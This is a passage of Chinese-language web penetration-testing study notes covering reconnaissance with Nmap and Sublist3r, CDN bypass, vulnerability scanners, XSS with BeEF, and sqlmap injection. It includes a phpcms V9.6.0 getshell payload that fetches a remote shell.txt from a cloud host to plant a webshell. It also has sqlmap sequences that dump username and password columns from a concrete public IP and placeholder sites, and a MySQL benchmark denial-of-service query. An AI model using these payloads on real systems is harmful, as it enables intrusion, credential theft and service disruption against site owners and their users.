href=\"http://www.nmap.com.cn/doc/manual.shtm\">http://www.nmap.com.cn/doc/manual.shtm</a></p>\n<p>​    Nmap官方手册：<a href=\"https://nmap.org/book/man.html\">https://nmap.org/book/man.html</a></p>\n<p>​    黑客电影：<a href=\"https://nmap.org/movies/\">https://nmap.org/movies/</a></p>\n<p>脚本保存位置：/usr/share/nmap/scripts/</p>\n<p>​    —whois信息扫描：nmap –script=whois-domain xxxx.com</p>\n<p>—DNS解析爆破扫描：nmap –script=dns-brut xxxx.com</p>\n<p>——把Nmap扫描结果保存到本地</p>\n<p>​    —标准保存：nmap -oN test.txt xxxx.com</p>\n<p>​    把输出结果保存到指定文件</p>\n<p>​    —保存为Xml格式：nmap -oX test.xml xxxx.com</p>\n<p>​    需要用浏览器打开，查看结果</p>\n<h2 id=\"子域名-amp-目录扫描\"><a href=\"#子域名-amp-目录扫描\" class=\"headerlink\" title=\"子域名&amp;目录扫描\"></a>子域名&amp;目录扫描</h2><p>——子域名打开就是404页面，403页面怎么做</p>\n<p>​    案例：如何发现ucweb.com的两个XSS</p>\n<p>​    <a href=\"https://nosec.org/home/detail/2011.html\">https://nosec.org/home/detail/2011.html</a></p>\n<p>——子域在线收集</p>\n<p>\\1.  谷歌语法：通过特定站点范围查询子域：sit: xxxx.com</p>\n<p>\\2.  在线枚举爆破：<a href=\"http://phpinfo.me/domain/\">http://phpinfo.me/domain/</a></p>\n<p>\\3.  证书搜索：基于SSL证书查询子域：<a href=\"https://crt.sh/\">https://crt.sh/</a></p>\n<p>\\4.  DNS搜索：基于DNS记录查询子域：<a href=\"https://dns.bufferover.run/dns?q=xxx\">https://dns.bufferover.run/dns?q=xxx</a></p>\n<p>——子域收集-Fuzzdomain工具</p>\n<p>​    使用github下载相应的子域发现工具：<a href=\"https://github.com/aboul3la/Sublist3r/\">https://github.com/aboul3la/Sublist3r/</a></p>\n<p>\\1.  安装模块：sudo pip install -r requirements.txt</p>\n<p>\\2.  枚举目标子域：python sublist3r.py -d aqlab.cn</p>\n<p>\\3.  枚举子域并且显示开放80和443端口的子域</p>\n<p>python sublist3r.py -d aqlab.cn -p 80,443</p>\n<p>\\4.  枚举目标子域并保存：python sublist3r.py -d aqlab.cn -o aqlab.txt</p>\n<p>——用户事件</p>\n<p>​    通过目标站点的用户事件找到子域以及敏感信息</p>\n<p>\\1.  历史漏洞</p>\n<p>乌云镜像：<a href=\"https://www.anquan.us/\">https://www.anquan.us/</a></p>\n<p>\\2.  使用手册，通知</p>\n<p>学院通知：<a href=\"https://dwz.cn/OOWeYYy6\">https://dwz.cn/OOWeYYy6</a></p>\n<p>——使用御剑后台扫描工具扫描敏感目录</p>\n<p>——robots.txt文件的作用</p>\n<p>​    —Robots协议：也称为爬虫协议、机器人协议等。全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</p>\n<p>​    —Robots.txt文件的重要性</p>\n<p>​       它是搜索引擎蜘蛛访问网站时要查看的第一个文件，并且会根据robots.txt文件内容来爬行网站。在某种意义上说，它的一个任务就是指导蜘蛛爬行，减少搜索引擎蜘蛛的工作量。</p>\n<p>​    —Robots.txt文件的存放位置</p>\n<p>​       网站根目录下，通过“域名/robots.txt”能正常访问即可，如http://域名/robots.txt</p>\n<p>​       写法：<a href=\"https://baijiahao.baidu.com/s?id=1616368344109675728&amp;wfr=spider&amp;for=pc\">https://baijiahao.baidu.com/s?id=1616368344109675728&amp;wfr=spider&amp;for=pc</a></p>\n<p>——目录扫描-dirbuster</p>\n<p>​    —文件目录：为实现“按名存取”，必须建立文件名与储存空间中物理地址的对应关系，体现这种对应关系的数据结构称为文件目录。</p>\n<p>​    —目录扫描：可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构。还能扫描敏感文件，后台文件，数据库文件，和信息泄露文件等等。</p>\n<p>​    —常见的目录信息泄露</p>\n<p>\\1.  目录遍历漏洞：（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞，使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（web根目录以外的文件），甚至执行系统命令。</p>\n<p>—目录遍历漏洞原理：程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p>\n<p>\\2.  敏感信息泄露：由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。</p>\n<p>比如：</p>\n<p>—通过访问url下的目录，可以直接列出目录下的文件列表；</p>\n<p>—输入错误的url参数后报错信息里包括操作系统、中间件、开发语言的版本或其他信息；（sql注入）</p>\n<p>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登陆地址、内网接口信息，甚至账号密码等。</p>\n<p>​    —常见的源码泄露案例</p>\n<p>​       目录遍历：当没有默认网页时，在网站上显示web服务器显示用户列表中的文件和目录。因此，在apachce服务器上默认文件名为index.php，当没有上传index.php时，服务器就会将文件夹中的内容全部展示出来。</p>\n<p>​       实例：攻击者浏览目录并访问web应用程序的源代码，备份可能的数据库文件。</p>\n<p>​       <a href=\"http://www.sohu.com/a/192064346_653604\">http://www.sohu.com/a/192064346_653604</a></p>\n<p>​    —常见的目录扫描方式</p>\n<p>\\1.  robots.txt：网站内的robots.txt文件</p>\n<p>\\2.  目录爆破：御剑 nikto dirbuster webdirscan…</p>\n<p>\\3.  第三方资源利用：Js SDK</p>\n<p>—dirbuster工具说明</p>\n<p>​    Owasp项目，它是一个多线程的基于java的应用程序设计用于暴力破解web应用服务器上的目录名和文件名的工具。</p>\n<p>​    工作原理：Dirbuster是一种履带式和粗暴式的混合物它遵循找到的页面中的所有链接，为可能的文件尝试不同的名称。这些名称可能位于我们使用的文件类似的文件中，也可能由Dirbuster使用Pure Brute Force选项自动生成，并设置字符集以及生成的单词的最小和最大长度。</p>\n<p>​    为确定文件是否存在，dirbuster使用服务器的响应代码。最常见的响应如下所示：</p>\n<p>​    200 ok：文件存在      404 找不到404文件：服务器中不存在该文件</p>\n<p>​    301 301永久移动       401 Unauthorized：访问此文件需要身份验证</p>\n<p>​    403 Forbidden：请求有效但服务器拒绝响应</p>\n<p>Dirbuster是用来探测web目录结构和隐藏的敏感文件的</p>\n<p>​    —环境配置</p>\n<p>​       Dirbuster是基于java的应用程序需要Jre环境</p>\n<p>​       Java环境下载：<a href=\"https://www.java.com/zh_CN/%EF%BC%88%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%89\">https://www.java.com/zh_CN/（加载器）</a></p>\n<p>​       安装过程中一定要勾选“add to path”（添加环境变量）</p>\n<p>​       Dirbuster下载地址：<a href=\"https://sourceforge.net/projects/dirbuster/files/\">https://sourceforge.net/projects/dirbuster/files/</a></p>\n<p>​      安装：windows用户双击Dirbuster.jar启动软件（Linux用户在命令行运行./DirBuster-1.0-RC1.sh，若脚本无执行权限使用chmod +x ./DirBuster-1.0-RC1.sh添加权限）</p>\n<p>—操作步骤：1，URL设置；2.线程数设置；3.选择爆破字典；4.取消选择递归查询；5.开始运行。</p>\n<p>——安全工具：<a href=\"https://habo.qq.com/tool/index\">https://habo.qq.com/tool/index</a></p>\n<p>——信息安全，黑客工具：<a href=\"https://www.ddosi.org/\">https://www.ddosi.org/</a></p>\n<p>——CMS指纹识别</p>\n<p>​    CMS（内容管理系统）（content management system）快速搭建网站</p>\n<p>​    web应用框架（web application framework）快速二次开发的web应用框架，例如网站,小程序。</p>\n<p>​    —在线和离线的方式收集指纹信息</p>\n<p>\\1.  云悉在线：<a href=\"http://www.yunsee.cn/\">http://www.yunsee.cn</a></p>\n<p>\\2.  whatweb：<a href=\"http://www.whatweb.net/\">http://www.whatweb.net</a></p>\n<p>\\3.  插件wappalyzer：<a href=\"https://www.wappalyzer.com/\">https://www.wappalyzer.com</a></p>\n<p>\\4.  脚本CMSeek：<a href=\"https://github.com/Tuhinshubhra/CMSeeK\">https://github.com/Tuhinshubhra/CMSeeK</a></p>\n<p>Webfinger：<a href=\"https://github.com/se55i0n/Webfinger\">https://github.com/se55i0n/Webfinger</a></p>\n<p>​    —WAF：全称为web application firewall，是一款针对web应用攻击的防护产品。当web应用越来越丰富的同时，大部分交互都转移到了web上，与此同时web也成为了主要的攻击目标，此时waf就成为了安全防护中的第一道防线，waf在安全中的重要性不言而喻。</p>\n<p>​    —常见的WAF产品以及检测方法</p>\n<p>\\1.  Awesome-WAF项目：<a href=\"https://github.com/0xInfection/Awesome-WAF\">https://github.com/0xInfection/Awesome-WAF</a></p>\n<p>\\2.  检测脚本：wafw00f：<a href=\"https://github.com/EnableSecurity/wafw00f\">https://github.com/EnableSecurity/wafw00f</a></p>\n<p>—CND：全称是content delivery network，即内容分发网络。基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈与环节，使内容传输得更快更稳定。</p>\n<p>​    使用在线以及离线的方式检测CDN:</p>\n<p>\\1.  国内在线-CDN云测：<a href=\"http://cdn.chinaz.com/\">http://cdn.chinaz.com/</a></p>\n<p>\\2.  国外在线-cdnplanet：<a href=\"https://www.cdnplanet.com/\">https://www.cdnplanet.com/</a></p>\n<p>\\3.  脚本探测-xcdn：<a href=\"https://github.com/3xp10it/xcdn\">https://github.com/3xp10it/xcdn</a></p>\n<p>—常见绕过CDN的方法</p>\n<p>​    都是通过寻找对方未绑定CDN站点进行突破，从而找到真实站点。</p>\n<p>常见的寻找真实IP的方法：</p>\n<p>超级ping：<a href=\"http://ping.chinaz.com/\">http://ping.chinaz.com/</a></p>\n<p>历史解析：微步在线：<a href=\"https://x.threatbook.cn/\">https://x.threatbook.cn/</a></p>\n<p>​           历史whois：<a href=\"https://www.benmi.com/whoishistory/\">https://www.benmi.com/whoishistory/</a></p>\n<p>​           历史托管：<a href=\"https://toolbar.netcraft.com/site_report?url=\">https://toolbar.netcraft.com/site_report?url=</a></p>\n<p>内部邮箱：对方发送邮件，查看邮箱来源IP。</p>\n<p>二级域名：寻找子域名找到未绑定的CDN站点。</p>\n<p>手机APP：使用Burp抓取手机APP数据包。</p>\n<p>微信公众号：使用Burp抓取微信公众号数据包。</p>\n<p>国外ping：ping.go：<a href=\"http://www.ping.ge/\">http://www.ping.ge</a></p>\n<p>​           海外测速：<a href=\"http://tool.chinaz.com/speedworld/\">http://tool.chinaz.com/speedworld/</a></p>\n<p>网络空间引擎：fofa：<a href=\"https://fofa.so/\">https://fofa.so</a></p>\n<p>CDN漏洞案例：CloudFlare防护下的破绽：<a href=\"https://www.freebuf.com/articles/web/41533.html\">https://www.freebuf.com/articles/web/41533.html</a></p>\n<p>某运营商CDN配置系统弱口令：<a href=\"http://suo.im/4EavrV\">http://suo.im/4EavrV</a></p>\n<p>——web综合信息收集</p>\n<p>​    —实战信息收集-关于目标网站所有的信息</p>\n<p>​       目标站点； 目的：拿到webshell；</p>\n<p>脚本语言：php中间件：iis6.0，nginx；cms：phpcms V9.6.0</p>\n<p>漏洞利用文章：<a href=\"http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/\">http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/</a></p>\n<p>​    —相关工具</p>\n<p>​       payload：[siteid=1&amp;modelid=11&amp;username=saesvens1&amp;password=ssevses&amp;mail=<a href=\"mailto:&#x73;&#115;&#101;&#118;&#101;&#x6e;&#x73;&#x73;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;\">&#x73;&#115;&#101;&#118;&#101;&#x6e;&#x73;&#x73;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;</a>&amp;info[content]= src=<a href=\"http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=\">http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</a></p>\n<p>​       中国蚁剑：<a href=\"https://blog.csdn.net/qq1045553189/article/details/87517612\">https://blog.csdn.net/qq1045553189/article/details/87517612</a></p>\n<p>​       蚁剑目录：<a href=\"https://github.com/AntSwordProject/antSword\">https://github.com/AntSwordProject/antSword</a></p>\n<p>​       加速器：<a href=\"https://github.com/AntSwordProject/AntSword-Loader\">https://github.com/AntSwordProject/AntSword-Loader</a></p>\n<p>​       蚁剑安装流程：<a href=\"https://blog.csdn.net/qq_36235492/article/details/85713821\">https://blog.csdn.net/qq_36235492/article/details/85713821</a></p>\n<p>​      中国菜刀：<a href=\"https://baike.baidu.com/item/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80/3963062?FR=ALADDIN\">https://baike.baidu.com/item/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80/3963062?FR=ALADDIN</a></p>\n<p>​       安装hackbar，社区搜索：<a href=\"https://bbs.zkaq.cn/t/3750.html\">https://bbs.zkaq.cn/t/3750.html</a></p>\n<h1 id=\"Web利用\"><a href=\"#Web利用\" class=\"headerlink\" title=\"Web利用\"></a>Web利用</h1><h2 id=\"Web漏洞扫描工具\"><a href=\"#Web漏洞扫描工具\" class=\"headerlink\" title=\"Web漏洞扫描工具\"></a>Web漏洞扫描工具</h2><p>——web漏洞扫描-简介</p>\n<p>\\1.  漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。</p>\n<p>\\2.  web漏洞扫描器</p>\n<p>针对于web应用程序所开发的漏洞扫描器，例如SQL注入、XSS跨站脚本攻击等常见漏洞，进行主动式扫描探测是否存在漏洞。Web漏洞扫描器之间也有区别，例如对于XSS漏洞测试的扫描器，商业的漏洞扫描器和非商业性的漏洞扫描器。</p>\n<p>通过扫描器能够快速的发现漏洞，来提升我们的效率，以及漏洞覆盖面。</p>\n<p>web扫描器也是在为我们做信息收集、为接下来的渗透测试做准备。</p>\n<p>——AWVS简介</p>\n<p>​    Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。</p>\n<p>​    AWVS帮助我们快速发现漏洞并进行输出报告，来提高工作效率。</p>\n<p>——AWVS安装：<a href=\"https://www.cnblogs.com/chun-xiaolin001/p/10060830.html\">https://www.cnblogs.com/chun-xiaolin001/p/10060830.html</a></p>\n<h2 id=\"WEB漏洞扫描器-AppScan\"><a href=\"#WEB漏洞扫描器-AppScan\" class=\"headerlink\" title=\"WEB漏洞扫描器-AppScan\"></a>WEB漏洞扫描器-AppScan</h2><p>​    AppScan，即AppScan standard edition。其安装在Windows操作系统上，可以对网站等web应用进行自动化的应用安全扫描和测试。</p>\n<p>​    Rational AppScan（简称AppScan）其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的AppScan source edition，到针对web应用进行快速扫描的AppScan standard edition，以及进行安全管理和汇总整合的AppScan enterprise Edition等。</p>\n<p>​    我们经常说的AppScan就是指的桌面版本的AppScan，即AppScan standard edition。其实装在windows上，也可以对网站等web应用进行自动化的安全扫描和测试。</p>\n<p>​    web扫描器也是在为我们做信息收集、为接下来的渗透测试做准备。</p>\n<h2 id=\"WEB漏洞扫描器-Burp-suite常规测试\"><a href=\"#WEB漏洞扫描器-Burp-suite常规测试\" class=\"headerlink\" title=\"WEB漏洞扫描器-Burp suite常规测试\"></a>WEB漏洞扫描器-Burp suite常规测试</h2><p>——简介</p>\n<p>​    Burp Suite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工的完成对web应用的渗透测试和攻击。在渗透测试中，我们使用Burp Suite将使得测试工作变得更加容易和方便，即使在不需要娴熟的技巧的情况下，只要熟悉使用Burp Suite，也使得渗透测试工作变得轻松和高效。</p>\n<p>​    Burp Suite是用于攻击web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了很多接口，以加速攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息、持久性、认证、代理、日志、警报。</p>\n<p>​    Burp Suite是渗透测试人员在工作中最常用的工具，用来分析数据包进行测试。</p>\n<p>——原理</p>\n<p>​    浏览器和相关应用程序的中间拦截、修改、重放数据包的代理工具。</p>\n<p>——安装配置</p>\n<p>\\1.  安装JAVA 64位环境：<a href=\"https://www.java.com/zh_CN/download/\">https://www.java.com/zh_CN/download/</a></p>\n<p>\\2.  安装jyphon环境jar版本：<a href=\"https://www.jython.org/download.html\">https://www.jython.org/download.html</a></p>\n<p>\\3.  安装Jruby环境jar版本：<a href=\"https://www.jruby.org/download\">https://www.jruby.org/download</a></p>\n<p>\\4.  设置浏览器代理</p>\n<p>\\5.  导入HTTPS证书</p>\n<p>—常用的模块</p>\n<p>\\1.  Burp Target；2. Burp Proxy; 3. Burp Intruder; 4. Burp Repeater; 5. Burp Extender</p>\n<h2 id=\"Burpsuite-插件利用检测\"><a href=\"#Burpsuite-插件利用检测\" class=\"headerlink\" title=\"Burpsuite-插件利用检测\"></a>Burpsuite-插件利用检测</h2><p>——Sqlmap插件安装</p>\n<p>\\1.  安装python环境； 2. 安装sqlmap；3. 添加环境变量；4. 下载sqlmap.jar扩展包：<a href=\"http://pan.baidu.com/s/1skDVwa5\">http://pan.baidu.com/s/1skDVwa5</a> 密码ce5f；5. burp加载插件。</p>\n<p>——xss插件安装</p>\n<p>\\1.  Phantomjs下载：<a href=\"http://phantomjs.org/download.html\">http://phantomjs.org/download.html</a> 配置环境变量，把bin目录下的exe加入环境变量，文件放在python目录下</p>\n<p>\\2.  安装xssValidator BApp Store</p>\n<p>\\3.  下载xss.js下载地址：<a href=\"https://github.com/nVisium/xssValidator\">https://github.com/nVisium/xssValidator</a></p>\n<p>\\4.  利用phantomjs运行xss.js C:\\xss\\phantomjs-2.1.1-windows\\bin&gt;phantomjsxss.js</p>\n<p>——xss插件和Burp使用</p>\n<p>\\1.  配置插件；2. 抓包发送到Intruder；3. 配置payloads为xssValidator；4. 配置Intruder option的grep -match；5. 开始</p>\n<p>——开源的插件项目</p>\n<p>​    Burp Suite的强大除了自身提供了丰富的可供测试人员使用的功能外，其提供的第三方拓展插件的功能也极大的方便使用者编写自己的自定义插件。它支持的插件类型有java，python，ruby，三种。无论哪种语言的实现，开发者只要选择自己熟悉的语言，按照接口规范去实现想要的功能即可。</p>\n<p>1．     BApp store插件商店下载；2. 开源插件项目github：<a href=\"https://github.com/search?utf8=%E2%9C%93%25q=burp\">https://github.com/search?utf8=%E2%9C%93%q=burp</a></p>\n<h2 id=\"xss漏洞初步学习\"><a href=\"#xss漏洞初步学习\" class=\"headerlink\" title=\"xss漏洞初步学习\"></a>xss漏洞初步学习</h2><p>——xss简介</p>\n<p>​    XSS跨站脚本攻击（Cross Site Scripting），是将java script代码插入web页面中，之后当用户浏览页面时，会执行嵌套在web页面里面的java script代码，从而达到攻击用户的目的。为了跟html里面的层叠样式表（CSS，Cascading Style Sheets）作区分，所以叫作XSS。</p>\n<p>​    注入攻击的本质，是吧用户输入的数据当作代码执行。</p>\n<p>​    这里有两个关键条件：1. 用户能够控制输入；2. 原本程序要执行的代码，拼接了用户输入的数据。</p>\n<p>——原理</p>\n<p>​    XXS主要拼接什么：SQL注入拼接的是操作数据库的SQL语句。XSS拼接的是网页的html代码，一般而言我们是可以拼接出合适的html代码去执行恶意的JS语句（总结：xss就是拼接恶意的html，执行并能够成功解析）</p>\n<p>​    xss的危害：盗取Cookie（用的最频繁的）；盗取内网ip；获取浏览器保存的明文密码；截取网页屏幕；网页上的键盘记录。</p>\n<p>——种类</p>\n<p>​    反射型：你提交的数据成功的实现了XSS，但是仅仅是对你这次访问产生了影响，是非持久性攻击。</p>\n<p>​    存储型XSS（持久性）：你提交的数据成功的实现了XSS，存入了数据库，别人访问这个页面的时候就会自动触发。</p>\n<p>​    DOM型XSS：DOM（document object model 文本对象模型），客户端脚本处理逻辑导致的安全问题。</p>\n<p>——XSS平台</p>\n<p>​    <a href=\"http://xss.tf/\">http://xss.tf/</a>      <a href=\"https://xsspt.com/index.php?do=login\">https://xsspt.com/index.php?do=login</a> 或搜索引擎搜索</p>\n<p>​    XSS平台方便了XSS攻击，只需要引入一个平台外部链接就可以实现各种功能。</p>\n<p>——挑战实例</p>\n<p>​    360插件：xss插件扫描Okee.360.cn</p>\n<p>​    更多工具：<a href=\"https://github.com/rajeshmajumdar/BruteXSS\">https://github.com/rajeshmajumdar/BruteXSS</a></p>\n<h2 id=\"beef-XSS\"><a href=\"#beef-XSS\" class=\"headerlink\" title=\"beef-XSS\"></a>beef-XSS</h2><p>——简介</p>\n<p>​    beef（The Browser Exploitation Framework）；一款浏览器攻击框架，用rubby语言开发的，kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。</p>\n<p>​    beef主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏览器访问了有hook.js（钩子）的页面，就会被hook（钩住），勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）向beef服务器发送一个请求，询问是否有新的代码需要执行。beef浏览器本质上就像一个web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示，beef持有者可以通过浏览器来登录beef的后端，来控制前端（用户的浏览器）。beef一般和XSS漏洞结合使用。</p>\n<p>​    —打开方式</p>\n<p>\\1.  直接点击桌面上的图标，过5秒左右，然后它会自动打开命令行和浏览器beef的登录框</p>\n<p>\\2.  任意目录，直接输入命令：beef-xss打开，过5秒左右，然后会自动打开命令行和beef浏览器的登录框</p>\n<p>\\3.  进入/usr/share/beef-xss/，输入命令：./beef打开，然后手动打开浏览器链接。</p>\n<p>—配置</p>\n<p>​    修改默认密码：vim /etc/beef-xss/config.yaml 修改配置文件</p>\n<p>​    测试界面：<a href=\"https://127.0.0.1:3000/demos/butcher/index.html\">https://127.0.0.1:3000/demos/butcher/index.html</a></p>\n<h2 id=\"sqlmap之sql注入原理利用\"><a href=\"#sqlmap之sql注入原理利用\" class=\"headerlink\" title=\"sqlmap之sql注入原理利用\"></a>sqlmap之sql注入原理利用</h2><p>——简介</p>\n<p>​    SQL注入就是把SQL命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句的。</p>\n<p>​    攻击者通过构造不同的SQL语句来实现对数据库的操作。</p>\n<p>​    关键条件：1. 参数用户可控；2. 参数带入数据库查询。</p>\n<p>​    —SqlMap-开源渗透测试工具</p>\n<p>\\1.  开源的渗透测试工具、自动化检测和利用SQL注入漏洞</p>\n<p>\\2.  支持对多种数据库进行注入测试</p>\n<p>\\3.  支持多种注入技术，例如，盲注、时间延时注入、报错注入</p>\n<p>\\4.  支持枚举用户数据库信息，例如，用户名、密码</p>\n<p>\\5.  自动识别哈希密码，并且使用密码字典进行破解</p>\n<p>sqlmap是渗透测试人员对sql注入漏洞进行检测的最佳工具</p>\n<p>——sqlmap安装</p>\n<p>\\1.  工具地址：<a href=\"https://github.com/sqlmapproject/sqlmap\">https://github.com/sqlmapproject/sqlmap</a></p>\n<p>\\2.  安装配置：<a href=\"https://www.python.org/downloads/windows/\">https://www.python.org/downloads/windows/</a></p>\n<p>\\3.  python2和python3共存：<a href=\"https://www.zkaq.org/t/3572.html\">https://www.zkaq.org/t/3572.html</a></p>\n<p>——sqlmap注入流程</p>\n<p>\\1.  判断sql注入点；2. 查询数据库信息；3. 根据数据库查询数据表；4. 根据数据表查询列信息。</p>\n<p>——sqlmap测试流程</p>\n<p>\\1.  检测是否存在注入点</p>\n<p>python sqlmap.py -u “<a href=\"http://117.41.229.122:8840/single.php?id=1%E2%80%9D\">http://117.41.229.122:8840/single.php?id=1”</a></p>\n<p>\\2.  检测数据库信息</p>\n<p>python sqlmap.py -u “<a href=\"http://117.41.229.122:8840/single.php?id=1%E2%80%9D\">http://117.41.229.122:8840/single.php?id=1”</a> –dbs</p>\n<p>\\3.  通过数据库查询数据表信息</p>\n<p>python sqlmap.py -u “<a href=\"http://117.41.229.122:8840/single.php?id=1%E2%80%9D\">http://117.41.229.122:8840/single.php?id=1”</a> -D cake –tables</p>\n<p>\\4.  通过数据表查询查询字段信息</p>\n<p>python sqlmap.py -u “<a href=\"http://117.41.229.122:8840/single.php?id=1%E2%80%9D\">http://117.41.229.122:8840/single.php?id=1”</a> -D cake –T user –columns</p>\n<p>\\5.  通过字段枚举字段内容</p>\n<p>python sqlmap.py -u “<a href=\"http://117.41.229.122:8840/single.php?id=1%E2%80%9D\">http://117.41.229.122:8840/single.php?id=1”</a> -D cake –T user -C “username.password” -dump</p>\n<p>——sqlmap命令操作</p>\n<p>\\1.  查看数据库相关信息</p>\n<p>–current-user      枚举当前用户</p>\n<p>–dbs             枚举当前数据库</p>\n<p>–is-dba           枚举可用的数据库</p>\n<p>–passwords       枚举数据库权限</p>\n<p>​    \\2. 指纹识别</p>\n<p>​       -f                启用广泛的数据识别</p>\n<p>​       -b                检测数据库指纹</p>\n<p>​       –hostname       枚举主机名称</p>\n<p>​    \\3. Waf识别</p>\n<p>​       –identify-waf     检测waf信息</p>\n<p>——sqlmap更新</p>\n<p>​    python sqlmap.py –update</p>\n<h2 id=\"sqlmap之sql注入一\"><a href=\"#sqlmap之sql注入一\" class=\"headerlink\" title=\"sqlmap之sql注入一\"></a>sqlmap之sql注入一</h2><p>——常见的注入方式</p>\n<p>\\1.  用于access数据库注入；2. 用于cookie注入；3. post注入；4. mysql注入</p>\n<p>常见SQLmap使用方法：<a href=\"https://www.cnblogs.com/hack404/p/10830239.html\">https://www.cnblogs.com/hack404/p/10830239.html</a></p>\n<p>​                      <a href=\"https://www.cnblogs.com/ichunqiu/p/5805108.html\">https://www.cnblogs.com/ichunqiu/p/5805108.html</a></p>\n<h1 id=\"一、SQLMAP用于Access数据库注入\"><a href=\"#一、SQLMAP用于Access数据库注入\" class=\"headerlink\" title=\"一、SQLMAP用于Access数据库注入\"></a>一、SQLMAP用于Access数据库注入</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;</span><br><span class=\"line\">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;` `--tables</span><br><span class=\"line\">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;` `--columns -T admin</span><br><span class=\"line\">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;` `--dump -T admin -C &quot;username,password&quot;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"二、SQLMAP用于Cookie注入\"><a href=\"#二、SQLMAP用于Cookie注入\" class=\"headerlink\" title=\"二、SQLMAP用于Cookie注入\"></a>二、SQLMAP用于Cookie注入</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python sqlmap.py-u&quot;`http://www.xxx.org/jsj/shownews.asp`&quot;` `--cookie &quot;id=31&quot; --table --level 2</span><br><span class=\"line\">python sqlmap.py-u&quot;`http://www.xxx.org/jsj/shownews.asp`&quot;` `--cookie &quot;id=31&quot; --columns -T</span><br><span class=\"line\">python sqlmap.py-u&quot;`http://www.xxx.org/jsj/shownews.asp`&quot;` `--cookie &quot;id=31&quot; --dump -T</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"三、SQLMAP用于mysql中DDOS攻击\"><a href=\"#三、SQLMAP用于mysql中DDOS攻击\" class=\"headerlink\" title=\"三、SQLMAP用于mysql中DDOS攻击\"></a>三、SQLMAP用于mysql中DDOS攻击</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python sqlmap.py-u [url]http://192.168.159.1/news.php?id=1[/url]--sql-shell</span><br><span class=\"line\">select` `benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"四、SQLMAP用于mysql注入\"><a href=\"#四、SQLMAP用于mysql注入\" class=\"headerlink\" title=\"四、SQLMAP用于mysql注入\"></a>四、SQLMAP用于mysql注入</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `--dbs</span><br><span class=\"line\">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `-D dataname--tables</span><br><span class=\"line\">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `-D dataname-T table_name--columns</span><br><span class=\"line\">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `-D dataname-T table_name-C &quot;id,user,password&quot;` `--dump</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"五、SQLMAP中post登陆框注入\"><a href=\"#五、SQLMAP中post登陆框注入\" class=\"headerlink\" title=\"五、SQLMAP中post登陆框注入\"></a>五、SQLMAP中post登陆框注入</h1><p>\\1. 浏览器打开目标地址http:// <a href=\"http://www.xxx.com/\">www.xxx.com</a> /Login.asp</p>\n<p>\\2. 配置burp代理(127.0.0.1:8080)以拦截请求</p>\n<p>\\3. 点击login表单的submit按钮</p>\n<p>\\4. 这时候Burp会拦截到了我们的登录POST请求</p>\n<p>\\5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p>\n<p>\\6. 运行sqlmap并使用如下命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./sqlmap.py -r search-test.txt -p 